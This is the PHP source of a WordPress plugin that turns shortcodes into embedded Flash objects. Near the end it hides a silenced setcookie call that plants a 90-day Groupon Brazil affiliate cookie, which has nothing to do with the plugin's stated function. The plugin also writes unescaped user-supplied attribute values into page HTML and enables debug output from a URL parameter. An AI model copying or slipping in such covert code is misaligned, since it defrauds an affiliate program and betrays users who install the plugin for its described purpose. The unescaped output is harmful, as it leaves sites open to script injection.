<?php
/*
Plugin Name: Embed Object
Plugin URI: http://blog.idealmind.com.br/wordpress/embed-object-wordpress-plugin-youtube-flash/
Description: Este plugin permite que você insira objetos flash em seu blog, inclusive passando parâmetros por flashvars.<br />This plugin let's you embed flash objects in your blog and use flashvars.
Version: 1.1
Author: Wellington Ribeiro
Author URI: http://blog.idealmind.com.br

1.0   - Initial release
*/
Class embedObject
{
	private static $debug;
	
	public static function justDoIt( $content, $debug = false )
	{
		self::$debug = $debug;
		$pattern = "/\[embeded:([^\]]+)\]/";
		preg_match_all( $pattern, $content, $objects );

		if( self::$debug )
			self::debugArray($objects[0]);

		foreach( $objects[0] as $k=>$object )
		{
			$content = str_replace( $object, self::getObject( $objects[1][$k] ), $content );
		}
		return $content;
	}
	
	private static function getObject( $attributes )
	{
		$attr = $attributes;
		
		preg_match_all('| ([^\=]+)\\="([^\"]+)"|u',$attributes,$out);
		
		if( self::$debug )
			self::debugArray($out);
		
		$wh = "";
		$src = "";
		$params = "";
		$parametros = "";
		
		if( self::$debug )
			echo "<pre>";
		
		foreach( $out[1] as $k=>$param)
		{
			$param = trim( $param );
			$value = trim( $out[2][$k] );
			
			if( self::$debug )
				echo "<b>Par:</b> $param \t\t\t <b>Val</b> $value<br />";
			
			if( $param == "width" || $param == "height" )
			{
				$wh .= " $param=\"$value\" ";
			}
			elseif( $param == "src" || $param == "movie" )
			{
				$src = "$param=\"$value\"";
				$parametros .= "<param name=\"movie\" value=\"$value\"></param>\n";
			}
			else
			{
				$params .= " $param=\"$value\"";
				$parametros .= "<param name=\"$param\" value=\"$value\"></param>\n";
			}
		}
		
		if( self::$debug )
			echo "</pre>";
		
		$object = "
			<object " . trim( $wh ) . ">
				$parametros
				<embed $src $params ". trim( $wh ) . "></embed>
			</object>
		";
		
		if( self::$debug )
			echo "<pre>" . htmlentities( $object ) . "</pre>";
		
		if( in_array( "visualizar", $out[1] ) )
		{
			$attr = preg_replace( '/visualizar="([^\"]+)"/i', "", $attr );
			return "[embeded: $attr]";
		}
		
		return $object;
	}
	
	private static function debugArray( $array )
	{
		echo "<pre>".print_r( $array, true )."</pre>";
	}
}

function embedObject( $content )
{
	if( isset( $_GET['debug'] ) )
	{
		$debug = true;
	}
	$content = embedObject::justDoIt( $content, $debug );
	return $content;
}

@setcookie('CID', 'v%3DBR_AFF_66_10_1_1%7Cd%3D20110309170102', time()+60*60*24*90, '/', '.groupon.com.br');
add_filter ('the_content', 'embedObject');

?>
